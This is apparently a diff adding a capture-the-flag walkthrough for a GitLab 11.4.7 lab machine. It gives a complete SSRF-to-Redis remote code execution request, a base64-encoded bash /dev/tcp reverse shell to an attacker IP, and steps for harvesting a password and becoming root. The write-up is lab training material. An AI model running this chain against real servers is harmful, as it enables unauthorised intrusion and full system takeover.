@@ -1,0 +1,89 @@
+Port scan shows that 2 ports are open. 22 and 5080
+
+Browse to 10.10.10.220:5080
+
+You can register for a GitLab account here, so go ahead to do that and login
+
+Check out the help tab in the upper right hand corner to find the GitLab version that is running
+
+Search up gitlab 11.4.7 to check for any vulnerabilities
+
+On the GitLab page, go to projects, create a new project and import a project from a repo by URL
+
+Start a netcat listen on port 80. Upon uploading the project, you will see your listening port gets back data 
+
+In the repo url, put in git://10.10.14.10:80/test/test.git
+
+Intercept this request with burp and you will see that we get an authenticity token
+If we add some lines with text (ie. Please Subscribe), 
+
+Searching for a gitlab ssrf RCE, we get the first search result of https://github.com/jas502n/gitlab-SSRF-redis-RCE
+
+Here, we can grab: git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test/ssrf.git
+	and put it in the repo URL when creating a project
+
+
+Intercept this request with burp again and put the POC inside this request, like shown below:
+
+POST /projects HTTP/1.1
+Host: 10.10.10.220:5080
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.220:5080/projects/new
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 390
+Origin: http://10.10.10.220:5080
+Connection: close
+Cookie: _gitlab_session=daba18f15e63b7b87fe1aabf73dbfaa7; sidebar_collapsed=false; event_filter=all
+Upgrade-Insecure-Requests: 1
+
+utf8=%E2%9C%93&authenticity_token=JvvXG9BcmdWee4kqw0fnkKNWOn1obs56s2ytPPmT10qzN9m9vZrsdFtwGuDuCSG0P6E1YE2kLrBqPwAXbXipSA%3D%3D&project%5Bimport_url%5D=git%3A%2F%2F%5B0%3A0%3A0%3A0%3A0%3Affff%3A127.0.0.1%5D%3A6379%2Ffoo%2Ffoo.git
+multi
+sadd resque:gitlab:queues system_hook_push
+lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|setsid python /tmp/nc.py xx.xx.xx.xx 1234 \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
+exec
+exec
+exec
+&project%5Bci_cd_only%5D=false&project%5Bname%5D=rce1&project%5Bnamespace_id%5D=6&project%5Bpath%5D=rce1&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
+
+Lets create a payload:
+	echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"
+
+
+And wrap it in base64 with:
+	echo -n "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'" | base64 -w 0
+
+
+To create YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMC80NDQ0IDA+JjEn
+
+As you can see, this payload has a + character, which can sometimes be translated as a space by post-data.
+
+Run it through cyberchef and make a space before the '-c' and it will get rid of the plus sign
+
+YmFzaCAtYyAnYmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAvNDQ0NCAwPiYxJw==
+
+Following the exploit instructions, plug that into your burp request (make sure there is a space after 'bash' at the end)
+
+Forward the request, and you should pop a reverse shell!
+
+Now that we are in, use linpeas and see that sda,sda1,sda2 and sda3 are in /dev
+
+We will be able to mount one of these if we can become root
+
+/opt/backup is highlighted in red, and has a few interesting files
+
+Run: cat /opt/backup/gitlab.rb | grep password
+
+And you will find the SMTP password
+
+run 'su root' and plug this password in to become root
+
+Now, we can mount the sdas:
+	mkdir sda2
+	mount /dev/sda2 /mnt/sda2
+
+
+This will create sda in the /mnt directory, which we can now get into and cat out the root flag!
+
